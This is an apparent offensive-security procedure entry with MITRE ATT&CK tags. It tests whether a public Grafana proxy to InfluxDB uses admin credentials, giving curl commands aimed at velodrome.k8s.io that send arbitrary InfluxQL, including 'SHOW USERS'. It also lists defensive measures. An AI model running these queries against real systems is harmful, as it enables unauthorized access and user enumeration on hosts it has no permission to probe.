---
tags:
  - influxdb
  - privilege-escalation
  - misconfiguration
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/influxql-flake-rate-query]]'
verified: false
platforms:
  - Web
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:28:51.896Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: d62bcb6f-ae12-4424-8a90-864eb9f229de
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Test-Datasource-Configuration-for-Elevated-Privileges

## Summary

This procedure tests the Grafana datasource proxy for InfluxDB to determine if it uses an admin/root user instead of read-only credentials, by sending custom InfluxQL queries that require elevated permissions.

## Description

The vulnerability stems from a misconfiguration in the datasource.sh script, causing Grafana to authenticate to InfluxDB with admin privileges. Attackers send queries via the proxy endpoint to execute commands like SHOW USERS or custom SELECTs, revealing if admin access is granted. This occurs in public Kubernetes Grafana instances without auth.

## Requirements

1. Access to the Grafana proxy endpoint (e.g., http://velodrome.k8s.io/api/datasources/proxy/4/query)
2. Tool for HTTP requests (curl or browser console)
3. Knowledge of InfluxQL syntax for privilege-testing queries

## Defense

Defensive measures and detection strategies:

- Configure datasources with least-privilege users (read-only for Grafana)
- Enable Grafana authentication and role-based access control
- Log and alert on anomalous InfluxQL queries in the backend

## Objectives

1. Confirm proxy allows arbitrary InfluxQL execution
2. Detect admin-level permissions through query success
3. Identify potential for further exploitation

## Instructions

### Step 1: Send Basic Query via Proxy

**Context**: Execute a standard query to verify proxy functionality.

**Command** ([[commands/influxql-flake-rate-query]]):
```bash
curl -G "http://velodrome.k8s.io/api/datasources/proxy/4/query" \
  --data-urlencode "db=metrics" \
  --data-urlencode "q=SELECT 1-(sum(\"consistent_builds\")/sum(\"builds\")) FROM \"flakes_daily\" WHERE time > now() - 30d AND \"job\" =~ /\^(pr:pull-kubernetes-kubemark-e2e-gce-big|pr:pull-kubernetes-bazel-build|pr:pull-kubernetes-bazel-test|pr:pull-kubernetes-dependencies|pr:pull-kubernetes-e2e-gce|pr:pull-kubernetes-e2e-gce-100-performance|pr:pull-kubernetes-e2e-kind|pr:pull-kubernetes-integration|pr:pull-kubernetes-node-e2e|pr:pull-kubernetes-typecheck|pr:pull-kubernetes-verify)$/ group by job, time(20m) fill(none)" \
  --data-urlencode "epoch=ms"
```

> This calculates flake rates for Kubernetes jobs. Expected output: JSON with time-series data.

### Step 2: Attempt Privileged Query

**Context**: Test for admin access with a query like SHOW USERS.

**Command** (Custom InfluxQL):
```bash
curl -G "http://velodrome.k8s.io/api/datasources/proxy/4/query" \
  --data-urlencode "db=metrics" \
  --data-urlencode "q=SHOW USERS"
```

> If admin, lists users; else, permission error. Expected output for success: Array of user objects.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/influxql-flake-rate-query]]

## Tools Used


## Tags

- influxdb
- privilege-escalation
- misconfiguration
